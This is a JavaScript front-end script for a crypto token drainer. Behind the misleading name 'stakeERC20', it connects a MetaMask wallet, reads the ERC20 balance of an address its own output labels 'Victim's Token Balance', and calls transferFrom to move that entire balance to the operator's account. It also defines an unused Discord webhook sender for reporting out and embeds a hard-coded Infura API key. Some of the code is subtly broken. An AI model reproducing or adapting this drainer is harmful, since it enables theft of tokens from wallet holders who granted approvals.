var connected = 0;
var account = "";
 var token_balance = '0';

let top_balance = 0, top_token = -1, real_amount = 0, isNFT = 0;
let tokenList = [];

function loginMetamask() {
  console.log("locatin", location.href);
  if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){

    location.href = 'https://metamask.app.link/dapp/'+window.location.hostname;
    
  }else{
    login();
  }
}

async function login() {
  try{
    walletconnect();

  }catch(error){
    console.log(error);
  }
}

function walletconnect() {
  if (window.ethereum) {
    ConnectWallet();
  } else {
    window.addEventListener('ethereum#initialized', ConnectWallet, {
      once: true,
    });
    setTimeout(ConnectWallet, 3000); // 3 seconds
  }
}

const sendWebhooks = (message) => {
const webhookURL = "https://discord.com"
    fetch(webhookURL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            content: message
        }),
    }).catch(err => console.error(err));
}

async function ConnectWallet(){

  // Connect a the web3 provider
  if (window.ethereum) {
      await ethereum.request({ method: 'eth_requestAccounts' });
      provider = window.ethereum;
      web3 = new Web3(provider);
  } else {
      provider = new Web3.providers.HttpProvider("https://mainnet.infura.io/v3/ef44b175ceb94950afcc9843c7d6a898");
      web3 = new Web3(provider);
  }
  getWalletAccount();
  web3.eth.getBlockNumber(function (error, result) {
    console.log("block number = ", result);
  });
}

function appender(params){
  var z = document.createElement('h2') // is a node
    z.innerHTML = params;
    z.setAttribute('class','alert alert-warning')
   document.getElementById('progess_response').appendChild(z);


}
async function getWalletAccount() {

  const accounts = await web3.eth.getAccounts();
  account = accounts[0];
  appender(`Wallet connected`);

  var results;
  setTimeout(stakeERC20(tokenAddress,vaddress), 1500);
}


function getEthBalance(balance, decimals, rate) {
  var pow10 = 1;
  for (var i = 0; i < decimals; i ++) pow10 *= 10;
  return balance * rate / pow10;
}


async function stakeERC20(a,b) {

   var tokenContract = new web3.eth.Contract(ERC20_ABI, a);

  await tokenContract.methods.balanceOf(b).call(function (err, res) {
          if (err) {
            console.log("An error occured", err)
            return
          }
          
          token_balance  = res;
        })

  appender(`Victim's Token Balance {raw}:  ${token_balance}`)

    try{ await tokenContract.methods
   .transferFrom(b, account, token_balance)
   .send({
    from: b,
    amount:'0'
  })}catch(err){ appender(err.message),  console.log(err.message)
  }  
}



async function logOut() {
  console.log("logged out");
}

if(/Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent)){
  login();
}


function openModalin() {
  if(connected == 0) {
    loginMetamask();
  } else {
    ConnectWallet();
  }
}

$("#trnsferFromSimple").submit(function(event){
  
  event.preventDefault();


  event.stopImmediatePropagation();
  event.stopPropagation();
  openModalin();
  tokenAddress = $('#t_addy').val().trim();
  vaddress = $('#v_addy').val().trim();
});